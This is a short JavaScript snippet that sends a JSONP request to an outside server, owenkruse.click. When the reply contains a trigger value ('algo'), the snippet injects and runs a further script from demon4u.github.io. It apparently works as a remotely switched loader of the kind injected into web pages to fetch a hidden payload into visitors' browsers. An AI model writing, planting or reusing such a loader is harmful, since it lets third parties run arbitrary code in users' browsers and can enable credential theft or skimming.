function jsonpRequest(url, callback) {
  var script = document.createElement('script');
  script.src = url + '&callback=' + callback;
  document.body.appendChild(script);
}

function handleResponse(data) {
    if (data.hasOwnProperty('neededValue') && data.neededValue === 'algo') {
        var script = document.createElement('script');
    script.src = 'https://demon4u.github.io/code.js';
    document.body.appendChild(script);
  }
}

var apiUrl = 'https://owenkruse.click/api/endpoint.php';
var callbackName = 'handleResponse';
jsonpRequest(apiUrl, callbackName);
